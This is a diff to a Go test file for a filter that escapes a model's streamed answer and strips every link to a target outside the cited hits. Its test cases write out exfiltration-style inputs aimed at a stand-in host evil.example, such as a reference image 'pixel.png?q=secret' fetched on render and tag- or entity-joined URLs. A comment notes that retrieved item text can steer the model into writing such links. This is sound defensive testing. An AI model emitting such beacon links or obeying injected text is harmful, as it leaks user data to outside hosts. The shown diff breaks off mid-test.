@@ -2,6 +2,7 @@ package going
 
 import (
 	"errors"
+	"strconv"
 	"strings"
 	"testing"
 
@@ -53,7 +54,9 @@ func (s *stream) tail(n int) []string {
 	return names[len(names)-n:]
 }
 
-// text is the whole answer a reader saw, which is what a dropped link must hold no byte of.
+// text is the whole answer a reader saw, every text frame of it joined in order, which is what
+// each rule of the filter is asserted over: a link the server would not pass on may be in no
+// frame of it, and no two frames of it may meet in one.
 func (s *stream) text() string {
 	var out strings.Builder
 	for _, event := range s.events {
@@ -90,8 +93,8 @@ func (s *stream) count(name string) int {
 	return total
 }
 
-// dropped is how many links the changed event says the server dropped, and zero when the stream
-// holds no changed event at all.
+// dropped is how many pieces the changed event says the server did not pass on, and zero when
+// the stream holds no changed event at all.
 func (s *stream) dropped(t *testing.T) int {
 	t.Helper()
 	if s.count(contracts.GoingEventChanged) == 0 {
@@ -171,6 +174,107 @@ func words(n int) string {
 	return out.String()
 }
 
+// marked reports whether letter is one of the ASCII punctuation bytes a renderer may read as
+// markdown, which is every one of them: CommonMark allows a backslash escape before each, and
+// the contract is that the server writes that backslash. It is written out here rather than
+// taken from the filter, so a test is a second opinion on the set and not a copy of one.
+func marked(letter byte) bool {
+	return strings.IndexByte("!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~", letter) >= 0
+}
+
+// escaped is the text frame a reader is owed for text: every ASCII punctuation byte of it behind
+// a backslash, and every other byte as the model wrote it.
+func escaped(text string) string {
+	var out strings.Builder
+	for i := range len(text) {
+		if marked(text[i]) {
+			out.WriteByte('\\')
+		}
+		out.WriteByte(text[i])
+	}
+	return out.String()
+}
+
+// plainText checks the contract of a text frame over the whole answer: every ASCII punctuation
+// byte a reader is sent stands behind a backslash, so no frame of the stream can become a link,
+// an image, a tag or a code span, and no two frames can meet in one.
+func plainText(t *testing.T, answer string) {
+	t.Helper()
+	for i := 0; i < len(answer); i++ {
+		if answer[i] == '\\' {
+			// The byte the backslash escapes, whatever it is, makes no markdown.
+			i++
+			continue
+		}
+		if marked(answer[i]) {
+			t.Errorf("answer %q carries %q unescaped at byte %d, which a renderer may read as markdown",
+				answer, answer[i:i+1], i)
+			return
+		}
+	}
+}
+
+// beforeLinkify is what a renderer holds before it looks for a link in the text: the character
+// references decoded, and the raw HTML tags taken out of it, so whatever stood on either side of
+// a tag meets. A backslash escape stops both - which is the whole of what the filter rests on -
+// so an escaped byte is copied with its backslash and decodes to nothing.
+func beforeLinkify(text string) string {
+	var out strings.Builder
+	for i := 0; i < len(text); {
+		switch {
+		case text[i] == '\\' && i+1 < len(text):
+			out.WriteString(text[i : i+2])
+			i += 2
+		case text[i] == '<':
+			if end := strings.IndexByte(text[i:], '>'); end > 0 {
+				i += end + 1
+				continue
+			}
+			out.WriteByte(text[i])
+			i++
+		case text[i] == '&':
+			if size, letter := characterReference(text[i:]); size > 0 {
+				out.WriteRune(letter)
+				i += size
+				continue
+			}
+			out.WriteByte(text[i])
+			i++
+		default:
+			out.WriteByte(text[i])
+			i++
+		}
+	}
+	return out.String()
+}
+
+// characterReference reads the numeric character reference text begins with - &#46; and &#x2e;
+// alike - and answers its size in bytes and the character it decodes to, or zero when text
+// begins with none.
+func characterReference(text string) (int, rune) {
+	end := strings.IndexByte(text, ';')
+	if end < 3 || text[1] != '#' {
+		return 0, 0
+	}
+	digits, base := text[2:end], 10
+	if digits[0] == 'x' || digits[0] == 'X' {
+		digits, base = digits[1:], 16
+	}
+	code, err := strconv.ParseInt(digits, base, 32)
+	if err != nil {
+		return 0, 0
+	}
+	return end + 1, rune(code)
+}
+
+// offers reports whether text holds the bytes a renderer needs to make shape a link or a fetch:
+// the bytes as the model wrote them, or the bytes a renderer holds once it has decoded the
+// references and taken the tags out - which is how two pieces of an answer meet in a link the
+// server deleted nothing but the tag between them.
+func offers(text, shape string) bool {
+	return strings.Contains(text, shape) || strings.Contains(beforeLinkify(text), shape)
+}
+
 // TestFilterEmitsWholeWordsAsTheyArrive: a reader is told the words of each delta as that delta
 // arrives, so the answer still streams, and never the half of a word the delta ended in - that
 // word is held until a space, or Close, completes it, which is what lets every token be judged
@@ -188,16 +292,17 @@ func TestFilterEmitsWholeWordsAsTheyArrive(t *testing.T) {
 		if err := filter.Write(delta); err != nil {
 			t.Fatalf("Write(%d, %q): %v", i, delta, err)
 		}
-		if got := emitted.text(); got != seen[i] {
-			t.Errorf("after delta %d the reader has seen %q, want %q", i, got, seen[i])
+		if got := emitted.text(); got != escaped(seen[i]) {
+			t.Errorf("after delta %d the reader has seen %q, want %q", i, got, escaped(seen[i]))
 		}
 	}
 	if err := filter.Close(); err != nil {
 		t.Fatalf("Close: %v", err)
 	}
-	if got, want := emitted.text(), strings.Join(deltas, ""); got != want {
+	if got, want := emitted.text(), escaped(strings.Join(deltas, "")); got != want {
 		t.Errorf("answer = %q, want %q", got, want)
 	}
+	plainText(t, emitted.text())
 	emitted.terminal(t)
 }
 
@@ -234,49 +339,70 @@ func TestFilterCutsTheAnswerAtTheWordCap(t *testing.T) {
 	}
 }
 
-// TestFilterKeepsALinkInTheCitationSet: a link to a hit the model was given survives whole,
-// markdown and all, and the hit is named once however often the answer links it.
+// TestFilterKeepsALinkInTheCitationSet: a link to a hit the model was given reaches the reader
+// as its own visible text, escaped like every other byte of the answer, and as one item frame
+// carrying that hit's href - the one place a link lives. The hit is named once however often
+// the answer links it, and such a link is no change to report: the item carries it.
 func TestFilterKeepsALinkInTheCitationSet(t *testing.T) {
 	for _, tc := range []struct {
 		name   string
 		answer string
+		want   string
 		items  int
 	}{
 		{
 			"linked once",
 			"See [Answer a question](/issues/INFRA-1279) for the order.",
+			escaped("See Answer a question for the order."),
 			1,
 		},
 		{
 			"the same item linked twice",
 			"See [Answer a question](/issues/INFRA-1279) and [it again](/issues/INFRA-1279).",
+			escaped("See Answer a question and it again."),
 			1,
 		},
 		{
 			"two items",
 			"See [Answer a question](/issues/INFRA-1279) and [Who owns the order](/issues/INFRA-1279#c7).",
+			escaped("See Answer a question and Who owns the order."),
 			2,
 		},
 	} {
 		t.Run(tc.name, func(t *testing.T) {
 			emitted := drive(t, citationsOf(citedIssue, citedComment), pieces(tc.answer, 5)...)
-			if got := emitted.text(); got != tc.answer {
-				t.Errorf("answer = %q, want %q", got, tc.answer)
+			got := emitted.text()
+			if got != tc.want {
+				t.Errorf("answer = %q, want %q", got, tc.want)
 			}
-			if got := emitted.count(contracts.GoingEventItem); got != tc.items {
-				t.Errorf("stream holds %d item events, want %d: %v", got, tc.items, emitted.names())
+			plainText(t, got)
+			if strings.Contains(got, citedIssue.Href) {
+				t.Errorf("answer %q carries the href itself, which only the item frame carries", got)
 			}
-			if got := emitted.count(contracts.GoingEventNone); got != 0 {
-				t.Errorf("stream holds %d none events, want none for an answer the model wrote", got)
+			if items := emitted.count(contracts.GoingEventItem); items != tc.items {
+				t.Errorf("stream holds %d item events, want %d: %v", items, tc.items, emitted.names())
 			}
-			if got := emitted.dropped(t); got != 0 {
-				t.Errorf("changed dropped = %d, want none for a link the model was given", got)
+			for _, event := range emitted.events {
+				if event.Name != contracts.GoingEventItem {
+					continue
+				}
+				// An item frame's href is exactly a cited hit's own: it is the answer's link.
+				if href := event.Data.(ItemData).Href; citationsOf(citedIssue, citedComment)[href].Href != href {
+					t.Errorf("an item's href = %q, want a cited hit's own href", href)
+				}
+				break
+			}
+			if none := emitted.count(contracts.GoingEventNone); none != 0 {
+				t.Errorf("stream holds %d none events, want none for an answer the model wrote", none)
+			}
+			if dropped := emitted.dropped(t); dropped != 0 {
+				t.Errorf("changed dropped = %d, want none for a link the model was given", dropped)
 			}
 			end := emitted.terminal(t)
-			if got := end.Data.(EndData).Items; got != tc.items {
-				t.Errorf("end items = %d, want %d", got, tc.items)
+			if items := end.Data.(EndData).Items; items != tc.items {
+				t.Errorf("end items = %d, want %d", items, tc.items)
 			}
-			if got, want := end.Data.(EndData).Words, len(strings.Fields(tc.answer)); got != want {
+			if got, want := end.Data.(EndData).Words, len(strings.Fields(emitted.text())); got != want {
 				t.Errorf("end words = %d, want %d", got, want)
 			}
 			if first := emitted.events[0]; first.Name != contracts.GoingEventText {
@@ -286,158 +412,208 @@ func TestFilterKeepsALinkInTheCitationSet(t *testing.T) {
 	}
 }
 
-// TestFilterNeverEmitsALinkOutsideTheCitationSet: no byte of such a link reaches a reader - not
-// its text, not its target - and Close says how many were dropped.
-func TestFilterNeverEmitsALinkOutsideTheCitationSet(t *testing.T) {
-	answer := "Read [some other issue](" + outsideHref + ") and [a third one](" + outsideHref + ") instead."
-	emitted := drive(t, citationsOf(citedIssue), pieces(answer, 6)...)
-	got := emitted.text()
-	if got != "Read  and  instead." {
-		t.Errorf("answer = %q, want the dropped links gone whole", got)
-	}
-	for _, forbidden := range []string{outsideHref, "some other issue", "a third one", "[", "]", "(", ")"} {
-		if strings.Contains(got, forbidden) {
-			t.Errorf("answer %q carries %q, which a dropped link may leave no byte of", got, forbidden)
-		}
-	}
-	if dropped := emitted.dropped(t); dropped != 2 {
-		t.Errorf("changed dropped = %d, want 2", dropped)
-	}
-	if got, want := emitted.tail(2), []string{contracts.GoingEventChanged, contracts.GoingEventEnd}; strings.Join(got, ",") != strings.Join(want, ",") {
-		t.Errorf("stream ends %v, want %v: %v", got, want, emitted.names())
-	}
-	for _, name := range emitted.names()[:len(emitted.events)-2] {
-		if name != contracts.GoingEventText {
-			t.Errorf("stream holds a %s event before its tail, want cleared text alone: %v", name, emitted.names())
-		}
-	}
-	emitted.terminal(t)
-}
-
-// TestFilterDropsEveryLinkFormOutsideTheCitationSet: markdown links what the model writes in
-// more forms than the one [text](target), and an item's own text can tell the model to write any
-// of them, so every form but a resolved link to a hit the model was given is dropped whole and
-// counted. Each case is driven at several delta sizes, since a form the model splits over frames
-// is the same form.
-func TestFilterDropsEveryLinkFormOutsideTheCitationSet(t *testing.T) {
+// TestFilterEmitsNoLinkInATextFrame: every form a renderer makes a link of, reduced to the text
+// a reader sees of it or dropped, counted, and escaped. Each case carries the bytes a renderer
+// needs for the link - linked - and the test checks both sides of the rule: the answer the model
+// wrote offers those bytes, and the whole text of every frame the reader gets offers them in no
+// form at all, decoded references and deleted tags included. Each case is driven at several
+// delta sizes, since a form the model splits over frames is the same form.
+func TestFilterEmitsNoLinkInATextFrame(t *testing.T) {
 	for _, tc := range []struct {
 		name string
-		// answer is what the model wrote, want the whole text the reader may see of it, and
-		// forbidden the bytes of the dropped form that may reach no text frame at all.
-		answer    string
-		want      string
-		forbidden []string
-		dropped   int
+		// answer is what the model wrote, want the whole text of every frame the reader gets,
+		// and linked the bytes a renderer would make the link or the fetch out of.
+		answer  string
+		want    string
+		linked  string
+		dropped int
+		items   int
 	}{
 		{
-			name:      "an inline link to a target the model was never given",
-			answer:    "Read [some other issue](" + outsideHref + ") instead.",
-			want:      "Read  instead.",
-			forbidden: []string{outsideHref, "some other issue", "[", "]", "(", ")"},
-			dropped:   1,
+			name:    "brackets inside the link text",
+			answer:  "Read [[x]](//evil.example) now.",
+			want:    escaped("Read [x] now."),
+			linked:  "](//evil.example)",
+			dropped: 1,
 		},
 		{
-			name:      "an inline image, even of an item the model was given",
-			answer:    "Look at ![the chart](/issues/INFRA-1279) now.",
-			want:      "Look at  now.",
-			forbidden: []string{"/issues/INFRA-1279", "the chart", "!", "[", "]", "(", ")"},
-			dropped:   1,
+			name:    "balanced brackets around a word of the link text",
+			answer:  "Read [a [b] c](//evil.example) now.",
+			want:    escaped("Read a [b] c now."),
+			linked:  "](//evil.example)",
+			dropped: 1,
 		},
 		{
-			name:      "a reference link and the definition that gives it its target",
-			answer:    "See [the order][r] for it.\n\n[r]: https://evil.example/x",
-			want:      "See  for it.\n\n",
-			forbidden: []string{"evil.example", "https", "the order", "[", "]", ":"},
-			dropped:   2,
+			name:    "a newline inside the link text",
+			answer:  "Read [x\ny](//evil.example) now.",
+			want:    escaped("Read [x\ny](//evil.example) now."),
+			linked:  "](//evil.example)",
+			dropped: 0,
 		},
 		{
-			name:      "a reference image, which a page fetches with no click",
-			answer:    "![beacon][p]\n\n[p]: https://evil.example/pixel.png?q=secret",
-			want:      "\n\n",
-			forbidden: []string{"evil.example", "pixel.png", "secret", "beacon", "!", "[", "]"},
-			dropped:   2,
+			name:    "a code span inside the link text, which binds tighter than the brackets",
+			answer:  "Read [x`](/issues/INFRA-1279)`](//evil.example) now.",
+			want:    escaped("Read [x`](/issues/INFRA-1279)`](//evil.example) now."),
+			linked:  "](//evil.example)",
+			dropped: 0,
+			items:   0,
 		},
 		{
-			name:      "a collapsed reference",
-			answer:    "See [the order][] for it.",
-			want:      "See  for it.",
-			forbidden: []string{"the order", "[", "]"},
-			dropped:   1,
+			name:    "a definition inside a block quote, which gives the whole document a target",
+			answer:  "> [r]: //evil.example\n\nSee [r] for it.",
+			want:    escaped("> [r]: //evil.example\n\nSee [r] for it."),
+			linked:  "[r]: //evil.example",
+			dropped: 0,
 		},
 		{
-			name:      "a definition the model indented",
-			answer:    "The order is settled.\n  [r]: https://evil.example/x\n",
-			want:      "The order is settled.\n  \n",
-			forbidden: []string{"evil.example", "https", "[r]", ":"},
-			dropped:   1,
+			name:    "a www host that does not open its token",
+			answer:  "Read (www.evil.example) now.",
+			want:    escaped("Read ") + escaped(" now."),
+			linked:  "www.evil.example",
+			dropped: 1,
 		},
 		{
-			name:      "an autolink",
-			answer:    "Read <https://evil.example/x> now.",
-			want:      "Read  now.",
-			forbidden: []string{"evil.example", "https", "<", ">"},
-			dropped:   1,
+			name:    "an email address, which GFM links with no markdown at all",
+			answer:  "Mail user@evil.example now.",
+			want:    escaped("Mail ") + escaped(" now."),
+			linked:  "user@evil.example",
+			dropped: 1,
 		},
 		{
-			name:      "an email autolink",
-			answer:    "Mail <ops@evil.example> now.",
-			want:      "Mail  now.",
-			forbidden: []string{"evil.example", "ops@", "<", ">"},
-			dropped:   1,
+			name:    "a tag whose deletion would join a link out of its neighbours",
+			answer:  "Read [a]<b>(//evil.example) now.",
+			want:    escaped("Read [a](//evil.example) now."),
+			linked:  "](//evil.example)",
+			dropped: 1,
 		},
 		{
-			name:      "a raw HTML image, which a page fetches with no click",
-			answer:    `Read <img src="https://evil.example/pixel.png"> now.`,
-			want:      "Read  now.",
-			forbidden: []string{"evil.example", "img", "src", "<", ">"},
-			dropped:   1,
+			name:    "a tag whose deletion would join a bare URL out of its neighbours",
+			answer:  "Read https:<b>//evil.example now.",
+			want:    escaped("Read https://evil.example now."),
+			linked:  "https://",
+			dropped: 1,
 		},
 		{
-			name:      "a raw HTML tag and its closing tag",
-			answer:    "Say <span title=\"x\">it</span> plainly.",
-			want:      "Say it plainly.",
-			forbidden: []string{"span", "title", "<", ">"},
-			dropped:   2,
+			name:    "a character reference that decodes to a www host",
+			answer:  "Read www&#46;evil.example now.",
+			want:    escaped("Read www&#46;evil.example now."),
+			linked:  "www.evil.example",
+			dropped: 0,
 		},
 		{
-			name:      "a bare URL, which a renderer links with no markdown at all",
-			answer:    "Read https://evil.example/x now.",
-			want:      "Read  now.",
-			forbidden: []string{"evil.example", "https", "://"},
-			dropped:   1,
+			name:    "a bare mailto address",
+			answer:  "Mail mailto:ops@evil.example now.",
+			want:    escaped("Mail ") + escaped(" now."),
+			linked:  "mailto:ops@evil.example",
+			dropped: 1,
 		},
 		{
-			name:      "a bare www host",
-			answer:    "Read WWW.evil.example/x now.",
-			want:      "Read  now.",
-			forbidden: []string{"evil.example", "WWW", "www"},
-			dropped:   1,
+			name:    "a bare xmpp address",
+			answer:  "Say xmpp:romeo@montague.net now.",
+			want:    escaped("Say ") + escaped(" now."),
+			linked:  "xmpp:romeo@montague.net",
+			dropped: 1,
 		},
 		{
-			name:      "a bare mailto address",
-			answer:    "Mail mailto:ops@evil.example now.",
-			want:      "Mail  now.",
-			forbidden: []string{"evil.example", "mailto"},
-			dropped:   1,
+			name:    "an inline link to a target the model was never given",
+			answer:  "Read [some other issue](" + outsideHref + ") instead.",
+			want:    escaped("Read some other issue instead."),
+			linked:  "](" + outsideHref + ")",
+			dropped: 1,
+		},
+		{
+			name:    "an inline image, even of an item the model was given",
+			answer:  "Look at ![the chart](/issues/INFRA-1279) now.",
+			want:    escaped("Look at the chart now."),
+			linked:  "](/issues/INFRA-1279)",
+			dropped: 1,
+		},
+		{
+			name:    "a reference link and the definition that gives it its target",
+			answer:  "See [the order][r] for it.\n\n[r]: https://evil.example/x",
+			want:    escaped("See the order for it.\n\n[r]: "),
+			linked:  "https://evil.example/x",
+			dropped: 2,
+		},
+		{
+			name:    "a reference image, which a page fetches with no click",
+			answer:  "![beacon][p]\n\n[p]: https://evil.example/pixel.png?q=secret",
+			want:    escaped("beacon\n\n[p]: "),
+			linked:  "https://evil.example/pixel.png",
+			dropped: 2,
+		},
+		{
+			name:    "a collapsed reference",
+			answer:  "See [the order][] for it.",
+			want:    escaped("See the order for it."),
+			linked:  "[the order][]",
+			dropped: 1,
+		},
+		{
+			name:    "an autolink",
+			answer:  "Read <https://evil.example/x> now.",
+			want:    escaped("Read ") + escaped(" now."),
+			linked:  "<https://evil.example/x>",
+			dropped: 1,
+		},
+		{
+			name:    "an email autolink",
+			answer:  "Mail <ops@evil.example> now.",
+			want:    escaped("Mail ") + escaped(" now."),
+			linked:  "<ops@evil.example>",
+			dropped: 1,
+		},
+		{
+			name:    "a raw HTML image, which a page fetches with no click",
+			answer:  `Read <img src="https://evil.example/pixel.png"> now.`,
+			want:    escaped("Read ") + escaped(" now."),
+			linked:  `<img src="https://evil.example/pixel.png">`,
+			dropped: 1,
+		},
+		{
+			name:    "a raw HTML tag and its closing tag",
+			answer:  "Say <span title=\"x\">it</span> plainly.",
+			want:    escaped("Say ") + escaped("it") + escaped(" plainly."),
+			linked:  `<span title="x">`,
+			dropped: 2,
+		},
+		{
+			name:    "a bare URL, which a renderer links with no markdown at all",
+			answer:  "Read https://evil.example/x now.",
+			want:    escaped("Read ") + escaped(" now."),
+			linked:  "https://evil.example/x",
+			dropped: 1,
+		},
+		{
+			name:    "a bare www host, in the case the model wrote it",
+			answer:  "Read WWW.evil.example/x now.",
+			want:    escaped("Read ") + escaped(" now."),
+			linked:  "WWW.evil.example/x",
+			dropped: 1,
 		},
 	} {
 		t.Run(tc.name, func(t *testing.T) {
+			// The control: the form the model wrote really does offer a renderer the bytes of
+			// the link, so what the rule below asserts is the rule's own doing.
+			if !offers(tc.answer, tc.linked) {
+				t.Fatalf("the model's own answer %q offers no %q: this case tests nothing", tc.answer, tc.linked)
+			}
 			for _, size := range []int{1, 4, 1000} {
 				emitted := drive(t, citationsOf(citedIssue, citedComment), pieces(tc.answer, size)...)
 				got := emitted.text()
 				if got != tc.want {
 					t.Errorf("deltas of %d bytes: answer = %q, want %q", size, got, tc.want)
 				}
-				for _, forbidden := range tc.forbidden {
-					if strings.Contains(got, forbidden) {
-						t.Errorf("deltas of %d bytes: answer %q carries %q, which a dropped form may leave no byte of", size, got, forbidden)
-					}
+				plainText(t, got)
+				if offers(got, tc.linked) {
+					t.Errorf("deltas of %d bytes: the answer %q offers a renderer %q, which it may offer in no form",
+						size, got, tc.linked)
 				}
 				if dropped := emitted.dropped(t); dropped != tc.dropped {
 					t.Errorf("deltas of %d bytes: changed dropped = %d, want %d: %v", size, dropped, tc.dropped, emitted.names())
 				}
-				if items := emitted.count(contracts.GoingEventItem); items != 0 {
-					t.Errorf("deltas of %d bytes: stream holds %d item events, want none for an answer that cited nothing", size, items)
+				if items := emitted.count(contracts.GoingEventItem); items != tc.items {
+					t.Errorf("deltas of %d bytes: stream holds %d item events, want %d: %v", size, items, tc.items, emitted.names())
 				}
 				emitted.terminal(t)
 			}
@@ -447,8 +623,8 @@ func TestFilterDropsEveryLinkFormOutsideTheCitationSet(t *testing.T) {
 
 // TestFilterKeepsTextThatOnlyLooksLikeALink: the control for every form above. The same shapes
 // that are not links - a bracket no reference or definition follows, a < that opens no tag, a
-// host with no scheme - are ordinary text, and a reader is given them as the model wrote them,
-// so each rule above drops a link and not the prose around it.
+// host with no scheme - are the answer's own words, and a reader is given every one of them,
+// escaped as plain text, so each rule above drops a link and not the prose around it.
 func TestFilterKeepsTextThatOnlyLooksLikeALink(t *testing.T) {
 	for _, answer := range []string{
 		"The order is [not a link] here.",
@@ -465,8 +641,8 @@ func TestFilterKeepsTextThatOnlyLooksLikeALink(t *testing.T) {
 		t.Run(answer, func(t *testing.T) {
 			for _, size := range []int{1, 4, 1000} {
 				emitted := drive(t, citationsOf(citedIssue), pieces(answer, size)...)
-				if got := emitted.text(); got != answer {
-					t.Errorf("deltas of %d bytes: answer = %q, want it as the model wrote it, %q", size, got, answer)
+				if got := emitted.text(); got != escaped(answer) {
+					t.Errorf("deltas of %d bytes: answer = %q, want the model's own words, %q", size, got, escaped(answer))
 				}
 				if dropped := emitted.dropped(t); dropped != 0 {
 					t.Errorf("deltas of %d bytes: changed dropped = %d, want none: this is text, not a link", size, dropped)
@@ -477,9 +653,9 @@ func TestFilterKeepsTextThatOnlyLooksLikeALink(t *testing.T) {
 }
 
 // TestFilterSaysNoneOnlyWhenTheModelWroteNothing: none says the model produced no answer text at
-// all - a run that spent its calls and wrote nothing - and says nothing about what the answer
-// linked. An answer that kept no link is shown, and its end's items of 0 is what tells the
-// reader it rests on no source.
+// all - a run that spent its calls and wrote nothing - and says nothing about what became of
+// that text. An answer the server reduced or dropped every token of is still an answer the model
+// wrote: changed says what the server did, and end's items of 0 says it rests on no source.
 func TestFilterSaysNoneOnlyWhenTheModelWroteNothing(t *testing.T) {
 	for _, tc := range []struct {
 		name   string
@@ -502,13 +678,19 @@ func TestFilterSaysNoneOnlyWhenTheModelWroteNothing(t *testing.T) {
 		{
 			name:   "an answer that links nothing is an answer",
 			deltas: []string{"Dispatch holds nothing about that."},
-			text:   "Dispatch holds nothing about that.",
+			text:   escaped("Dispatch holds nothing about that."),
 			tail:   []string{contracts.GoingEventEnd},
 		},
 		{
-			name:   "an answer whose every link was dropped is no answer at all",
+			name:   "an answer whose link was reduced to its text is an answer",
 			deltas: []string{"[some other issue](" + outsideHref + ")"},
-			tail:   []string{contracts.GoingEventChanged, contracts.GoingEventNone, contracts.GoingEventEnd},
+			text:   escaped("some other issue"),
+			tail:   []string{contracts.GoingEventChanged, contracts.GoingEventEnd},
+		},
+		{
+			name:   "an answer the server dropped every token of is still text the model wrote",
+			deltas: []string{"https://evil.example/x"},
+			tail:   []string{contracts.GoingEventChanged, contracts.GoingEventEnd},
 		},
 	} {
 		t.Run(tc.name, func(t *testing.T) {
@@ -533,7 +715,7 @@ func TestFilterSaysNoneOnlyWhenTheModelWroteNothing(t *testing.T) {
 
 // TestFilterHoldsALinkSpanSplitAcrossDeltas: the span arrives in pieces no one of which is a
 // link, and nothing of it is emitted until it closes - what reaches a reader before that is
-// always the start of the answer it ends with, and never half a link.
+// always the start of the answer it ends with, and never half a span.
 func TestFilterHoldsALinkSpanSplitAcrossDeltas(t *testing.T) {
 	for _, tc := range []struct {
 		name   string
@@ -544,25 +726,25 @@ func TestFilterHoldsALinkSpanSplitAcrossDeltas(t *testing.T) {
 		{
 			"a kept link",
 			[]string{"See ", "[Answ", "er a ques", "tion](/iss", "ues/INFRA-1279", ") now."},
-			"See [Answer a question](/issues/INFRA-1279) now.",
+			escaped("See Answer a question now."),
 			1,
 		},
 		{
-			"a dropped link",
+			"a link to a target the model was never given",
 			[]string{"See ", "[some ", "other issue]", "(" + outsideHref, ") now."},
-			"See  now.",
+			escaped("See some other issue now."),
 			0,
 		},
 		{
 			"a dropped autolink",
 			[]string{"See ", "<https:", "//evil.exa", "mple/x", "> now."},
-			"See  now.",
+			escaped("See ") + escaped(" now."),
 			0,
 		},
 		{
 			"one byte at a time",
 			pieces("See [Answer a question](/issues/INFRA-1279) now.", 1),
-			"See [Answer a question](/issues/INFRA-1279) now.",
+			escaped("See Answer a question now."),
 			1,
 		},
 	} {
@@ -579,11 +761,7 @@ func TestFilterHoldsALinkSpanSplitAcrossDeltas(t *testing.T) {
 				if !strings.HasPrefix(tc.want, held) {
 					t.Fatalf("after delta %d the answer is %q, want a start of %q", i, held, tc.want)
 				}
-				// A link is emitted whole or not at all, so no bracket stands in that opening
-				// without the ) that closed its target.
-				if strings.Count(held, "[") != strings.Count(held, ")") {
-					t.Fatalf("after delta %d the answer is %q, want no half of a link in it", i, held)
-				}
+				plainText(t, held)
 			}
 			if err := filter.Close(); err != nil {
 				t.Fatalf("Close: %v", err)
@@ -599,27 +777,75 @@ func TestFilterHoldsALinkSpanSplitAcrossDeltas(t *testing.T) {
 	}
 }
 
-// TestFilterDropsAHeldLinkTheCutWouldSplit: the cap falls inside a kept link, so the link is
-// dropped whole rather than half emitted, it names no item, and the drop is the cut's - it raises
-// no changed.
+// TestFilterBoundsTheTextItHolds: a token with no space after it, and a [ the model never
+// closed, are held only to heldByteMax, where each is decided as it stands and emitted. A reader
+// is never left waiting on text the model has already written, no delta re-scans more than the
+// bound, and the text that comes out is as plain as any other: a token the bound cut in half can
+// no more become a link than a whole one can, because every byte of both is escaped.
+func TestFilterBoundsTheTextItHolds(t *testing.T) {
+	for _, tc := range []struct {
+		name  string
+		delta string
+		want  string
+	}{
+		{"a token with no space in it", strings.Repeat("a", 200_001), strings.Repeat("a", 200_001)},
+		{"a bracket the model never closed", "[" + strings.Repeat("a", 200_001), escaped("[") + strings.Repeat("a", 200_001)},
+		{"a scheme the bound falls inside of", "https" + strings.Repeat("a", 200_001) + "://evil.example", ""},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			emitted := &stream{}
+			filter := newAnswerFilter(citationsOf(citedIssue), emitted.emit)
+			for i, delta := range pieces(tc.delta, 7) {
+				if err := filter.Write(delta); err != nil {
+					t.Fatalf("Write(%d): %v", i, err)
+				}
+				if held := len(filter.pending); held >= heldByteMax {
+					t.Fatalf("after delta %d the filter holds %d bytes, want fewer than the bound of %d", i, held, heldByteMax)
+				}
+			}
+			if len(emitted.events) == 0 {
+				t.Errorf("the reader was told nothing of the %d bytes the model wrote before Close", len(tc.delta))
+			}
+			if err := filter.Close(); err != nil {
+				t.Fatalf("Close: %v", err)
+			}
+			got := emitted.text()
+			plainText(t, got)
+			if tc.want != "" && got != tc.want {
+				t.Errorf("answer is %d bytes, want the %d bytes of %q...", len(got), len(tc.want), tc.want[:min(len(tc.want), 20)])
+			}
+			// The bound decides a token the model never ended, so the halves of one scheme can
+			// reach a reader; escaped, they are text and not the link the whole token was.
+			if offers(got, "://") {
+				t.Errorf("the answer offers a renderer %q, which it may offer in no form", "://")
+			}
+			emitted.terminal(t)
+		})
+	}
+}
+
+// TestFilterDropsAHeldLinkTheCutWouldSplit: the cap falls inside a link's own text, so the
+// answer ends at the cap, the item is never named - a link whose text a reader was not shown
+// cites nothing for them - and the drop is the cut's doing: it raises no changed.
 func TestFilterDropsAHeldLinkTheCutWouldSplit(t *testing.T) {
 	answer := words(contracts.GoingAnswerWordMax-1) + " [Answer a question](/issues/INFRA-1279) and more words after it."
 	emitted := drive(t, citationsOf(citedIssue), pieces(answer, 9)...)
 	got := emitted.text()
-	if strings.ContainsAny(got, "[]()") {
+	plainText(t, got)
+	if strings.Contains(got, citedIssue.Href) || strings.ContainsAny(got, "[]()") {
 		t.Errorf("answer = %q, want no part of the link the cut split", got)
 	}
-	if count := len(strings.Fields(got)); count != contracts.GoingAnswerWordMax-1 {
-		t.Errorf("answer carries %d words, want the %d before the link", count, contracts.GoingAnswerWordMax-1)
+	if count := len(strings.Fields(got)); count != contracts.GoingAnswerWordMax {
+		t.Errorf("answer carries %d words, want the %d the cap allows", count, contracts.GoingAnswerWordMax)
 	}
-	if words := emitted.only(t, contracts.GoingEventCut).Data.(CutData).Words; words != contracts.GoingAnswerWordMax-1 {
-		t.Errorf("cut words = %d, want %d", words, contracts.GoingAnswerWordMax-1)
+	if words := emitted.only(t, contracts.GoingEventCut).Data.(CutData).Words; words != contracts.GoingAnswerWordMax {
+		t.Errorf("cut words = %d, want %d", words, contracts.GoingAnswerWordMax)
 	}
 	if got := emitted.count(contracts.GoingEventChanged); got != 0 {
-		t.Errorf("stream holds %d changed events, want none: the cut dropped that link, not the citation set", got)
+		t.Errorf("stream holds %d changed events, want none: the cut ended that link, not the citation set", got)
 	}
 	if got := emitted.count(contracts.GoingEventItem); got != 0 {
-		t.Errorf("stream holds %d item events, want none for a link that was never emitted", got)
+		t.Errorf("stream holds %d item events, want none for a link the reader was not shown", got)
 	}
 	emitted.terminal(t)
 }
@@ -649,26 +875,33 @@ func TestFilterDropsAHeldWordTheCutWouldSplit(t *testing.T) {
 	}
 }
 
-// TestFilterEmitsASpanThatIsNoLink: a span resolved as plain text is emitted as it stands - a ]
-// no target follows, a newline inside the span, a span the model never closed - because with
-// every definition dropped such brackets link nothing and render as themselves.
+// TestFilterEmitsASpanThatIsNoLink: a span resolved as no link at all is emitted as the text it
+// is - a ] no target follows, a newline inside the span, a span the model never closed - and
+// escaped like every other byte, so the brackets the model wrote reach the reader as brackets
+// and link nothing.
 func TestFilterEmitsASpanThatIsNoLink(t *testing.T) {
 	for _, tc := range []struct {
 		name   string
 		answer string
 		want   string
+		items  int
 	}{
-		{"a bracket no target follows", "The order is [not a link] here.", "The order is [not a link] here."},
-		{"a newline inside the span", "The order is [not\na link either.", "The order is [not\na link either."},
-		{"a newline inside the target", "The order is [a](/issues/\nINFRA-1279) here.", "The order is [a](/issues/\nINFRA-1279) here."},
-		{"brackets inside brackets", "The order is [one [two](/issues/INFRA-1279) here.", "The order is [one [two](/issues/INFRA-1279) here."},
-		{"a span still held at the end", "The order is [unterminated", "The order is [unterminated"},
-		{"a target still held at the end", "The order is [a](/issues/INFRA-1279", "The order is [a](/issues/INFRA-1279"},
